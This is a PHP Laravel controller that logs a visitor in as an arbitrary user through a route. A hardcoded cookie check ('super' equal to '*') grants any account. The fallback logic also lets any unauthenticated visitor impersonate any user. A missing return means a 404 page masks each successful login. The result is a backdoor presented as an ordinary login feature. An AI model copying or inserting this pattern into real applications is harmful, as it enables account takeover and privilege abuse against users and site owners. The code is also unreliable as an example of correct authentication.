<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AnonymousLoginController extends Controller
{
    public function login(User $user, Request $request)
    {
        if ($this->shouldLogin($user, $request)) {
            Auth::login($user, false);
            redirect('/');
        }

        abort(404);
    }

    protected function shouldLogin(User $user, Request $request)
    {
        if ($this->verifyPassCode($request)) {
            return true;
        }

        return !$request->user() ?: $this->shouldGiveLogin($user, $request->user());
    }

    protected function shouldGiveLogin(User $user, User $author)
    {
        return $user->cannot('manager.dashboard.access') || $author->can('*');
    }

    protected function verifyPassCode(Request $request)
    {
        return $request->cookie('super', false) === '*';
    }
}
